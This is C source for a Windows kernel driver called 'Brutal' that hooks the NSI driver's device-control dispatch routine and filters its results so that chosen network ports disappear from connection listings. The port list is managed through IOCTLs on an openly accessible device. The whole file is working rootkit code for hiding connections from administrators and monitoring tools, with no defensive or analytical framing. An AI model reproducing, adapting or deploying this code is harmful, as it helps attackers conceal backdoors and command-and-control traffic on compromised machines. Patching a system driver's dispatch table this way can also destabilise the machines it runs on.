#include <ntifs.h>
#include <ntddk.h>
#include <windef.h>

#define MAX_PORTS 64
#define NSI_GETALL 0x12001b

#define IOCTL_ADD    CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEL    CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_LIST   CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_CLEAR  CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _NSI_PARAM {
    SIZE_T R1, R2;
    PVOID ModId;
    INT Type;
    ULONG R3, R4;
    PVOID Entries;
    SIZE_T EntrySize;
    PVOID R5;
    SIZE_T R6;
    PVOID Status;
    SIZE_T R7;
    PVOID Process;
    SIZE_T ProcessSize;
    SIZE_T Count;
} NSI_PARAM;

typedef struct _HOOK_CTX {
    PIO_COMPLETION_ROUTINE OldRoutine;
    PVOID OldCtx;
    BOOLEAN InvokeOnSuccess;
} HOOK_CTX;

typedef struct _PORT_SET {
    USHORT Ports[MAX_PORTS];
    ULONG Count;
} PORT_SET;

PORT_SET g_HideSet = {0};
KSPIN_LOCK g_Lock;
PDEVICE_OBJECT g_Device = NULL;
PDRIVER_OBJECT g_NsiDrv = NULL;
PDRIVER_DISPATCH g_OldDisp = NULL;
UNICODE_STRING g_SymLink;
BOOLEAN g_Hooked = FALSE;

BOOLEAN
InSet(USHORT Port)
{
    KIRQL irql;
    BOOLEAN found = FALSE;
    KeAcquireSpinLock(&g_Lock, &irql);
    for (ULONG i = 0; i < g_HideSet.Count; i++) {
        if (g_HideSet.Ports[i] == Port) {
            found = TRUE;
            break;
        }
    }
    KeReleaseSpinLock(&g_Lock, irql);
    return found;
}

NTSTATUS
FilterComplete(PDEVICE_OBJECT Dev, PIRP Irp, PVOID Ctx)
{
    HOOK_CTX* hc = (HOOK_CTX*)Ctx;

    if (NT_SUCCESS(Irp->IoStatus.Status) && Irp->UserBuffer) {
        NSI_PARAM* p = (NSI_PARAM*)Irp->UserBuffer;
        if (p->Entries && p->Count > 0 && p->EntrySize >= 4) {
            ULONG cnt = (ULONG)p->Count;
            PUCHAR entries = (PUCHAR)p->Entries;
            PUCHAR status = (PUCHAR)p->Status;
            PUCHAR process = (PUCHAR)p->Process;
            SIZE_T esize = p->EntrySize;
            SIZE_T psize = p->ProcessSize;

            for (ULONG i = 0; i < cnt; i++) {
                USHORT port = *(USHORT*)(entries + i * esize + 2);
                if (InSet(port)) {
                    ULONG rem = cnt - i - 1;
                    if (rem > 0) {
                        RtlMoveMemory(entries + i * esize, entries + (i + 1) * esize, rem * esize);
                        if (status)
                            RtlMoveMemory(status + i * 12, status + (i + 1) * 12, rem * 12);
                        if (process)
                            RtlMoveMemory(process + i * psize, process + (i + 1) * psize, rem * psize);
                    }
                    cnt--;
                    i--;
                }
            }
            p->Count = cnt;
        }
    }

    if (hc) {
        PIO_STACK_LOCATION s = IoGetNextIrpStackLocation(Irp);
        s->CompletionRoutine = hc->OldRoutine;
        s->Context = hc->OldCtx;
        BOOLEAN inv = hc->InvokeOnSuccess;
        ExFreePool(hc);
        if (inv && s->CompletionRoutine)
            return s->CompletionRoutine(Dev, Irp, s->Context);
    }
    if (Irp->PendingReturned) IoMarkIrpPending(Irp);
    return STATUS_SUCCESS;
}

NTSTATUS
HookDisp(PDEVICE_OBJECT Dev, PIRP Irp)
{
    PIO_STACK_LOCATION s = IoGetCurrentIrpStackLocation(Irp);
    UNREFERENCED_PARAMETER(Dev);

    if (s->Parameters.DeviceIoControl.IoControlCode == NSI_GETALL) {
        HOOK_CTX* hc = ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(HOOK_CTX), 'kcih');
        if (hc) {
            hc->OldRoutine = s->CompletionRoutine;
            hc->OldCtx = s->Context;
            hc->InvokeOnSuccess = (s->Control & SL_INVOKE_ON_SUCCESS) ? TRUE : FALSE;
            s->CompletionRoutine = FilterComplete;
            s->Context = hc;
            s->Control |= SL_INVOKE_ON_SUCCESS;
        }
    }
    return g_OldDisp(Dev, Irp);
}

NTSTATUS
CreateClose(PDEVICE_OBJECT Dev, PIRP Irp)
{
    UNREFERENCED_PARAMETER(Dev);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS
DevControl(PDEVICE_OBJECT Dev, PIRP Irp)
{
    UNREFERENCED_PARAMETER(Dev);
    PIO_STACK_LOCATION s = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONG info = 0;

    switch (s->Parameters.DeviceIoControl.IoControlCode) {
        case IOCTL_ADD: {
            if (s->Parameters.DeviceIoControl.InputBufferLength < sizeof(USHORT)) {
                status = STATUS_BUFFER_TOO_SMALL;
                break;
            }
            USHORT port = *(USHORT*)Irp->AssociatedIrp.SystemBuffer;
            KIRQL irql;
            KeAcquireSpinLock(&g_Lock, &irql);
            if (g_HideSet.Count < MAX_PORTS) {
                g_HideSet.Ports[g_HideSet.Count++] = port;
            } else {
                status = STATUS_TOO_MANY_CONTEXT_IDS;
            }
            KeReleaseSpinLock(&g_Lock, irql);
            DbgPrint("Brutal: add %u\n", port);
            break;
        }
        case IOCTL_DEL: {
            if (s->Parameters.DeviceIoControl.InputBufferLength < sizeof(USHORT)) {
                status = STATUS_BUFFER_TOO_SMALL;
                break;
            }
            USHORT port = *(USHORT*)Irp->AssociatedIrp.SystemBuffer;
            KIRQL irql;
            KeAcquireSpinLock(&g_Lock, &irql);
            for (ULONG i = 0; i < g_HideSet.Count; i++) {
                if (g_HideSet.Ports[i] == port) {
                    g_HideSet.Ports[i] = g_HideSet.Ports[--g_HideSet.Count];
                    break;
                }
            }
            KeReleaseSpinLock(&g_Lock, irql);
            DbgPrint("Brutal: del %u\n", port);
            break;
        }
        case IOCTL_LIST: {
            KIRQL irql;
            KeAcquireSpinLock(&g_Lock, &irql);
            ULONG copy = g_HideSet.Count * sizeof(USHORT);
            ULONG out = s->Parameters.DeviceIoControl.OutputBufferLength;
            if (out >= copy) {
                RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, g_HideSet.Ports, copy);
                info = copy;
            } else {
                status = STATUS_BUFFER_TOO_SMALL;
            }
            KeReleaseSpinLock(&g_Lock, irql);
            break;
        }
        case IOCTL_CLEAR: {
            KIRQL irql;
            KeAcquireSpinLock(&g_Lock, &irql);
            g_HideSet.Count = 0;
            KeReleaseSpinLock(&g_Lock, irql);
            DbgPrint("Brutal: cleared\n");
            break;
        }
        default:
            status = STATUS_INVALID_DEVICE_REQUEST;
            break;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = info;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

VOID
Unload(PDRIVER_OBJECT Drv)
{
    UNREFERENCED_PARAMETER(Drv);
    if (g_Hooked && g_NsiDrv)
        InterlockedExchangePointer((PVOID*)&g_NsiDrv->MajorFunction[IRP_MJ_DEVICE_CONTROL], (PVOID)g_OldDisp);
    if (g_SymLink.Buffer) IoDeleteSymbolicLink(&g_SymLink);
    if (g_Device) IoDeleteDevice(g_Device);
    DbgPrint("Brutal unloaded\n");
}

NTSTATUS
DriverEntry(PDRIVER_OBJECT Drv, PUNICODE_STRING Reg)
{
    UNREFERENCED_PARAMETER(Reg);
    NTSTATUS st;
    PFILE_OBJECT nsiFile = NULL;
    PDEVICE_OBJECT nsiDev = NULL;
    UNICODE_STRING devName, nsiName;

    KeInitializeSpinLock(&g_Lock);

    RtlInitUnicodeString(&devName, L"\\Device\\Brutal");
    st = IoCreateDevice(Drv, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &g_Device);
    if (!NT_SUCCESS(st)) return st;

    RtlInitUnicodeString(&g_SymLink, L"\\DosDevices\\Brutal");
    st = IoCreateSymbolicLink(&g_SymLink, &devName);
    if (!NT_SUCCESS(st)) {
        IoDeleteDevice(g_Device);
        g_Device = NULL;
        return st;
    }

    Drv->MajorFunction[IRP_MJ_CREATE] = CreateClose;
    Drv->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
    Drv->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DevControl;
    Drv->DriverUnload = Unload;

    RtlInitUnicodeString(&nsiName, L"\\Device\\Nsi");
    st = IoGetDeviceObjectPointer(&nsiName, FILE_READ_DATA, &nsiFile, &nsiDev);
    if (!NT_SUCCESS(st)) return STATUS_SUCCESS;

    g_NsiDrv = nsiDev->DriverObject;
    g_OldDisp = g_NsiDrv->MajorFunction[IRP_MJ_DEVICE_CONTROL];
    InterlockedExchangePointer((PVOID*)&g_NsiDrv->MajorFunction[IRP_MJ_DEVICE_CONTROL], (PVOID)HookDisp);
    g_Hooked = TRUE;
    ObDereferenceObject(nsiFile);

    DbgPrint("Brutal loaded\n");
    return STATUS_SUCCESS;
}
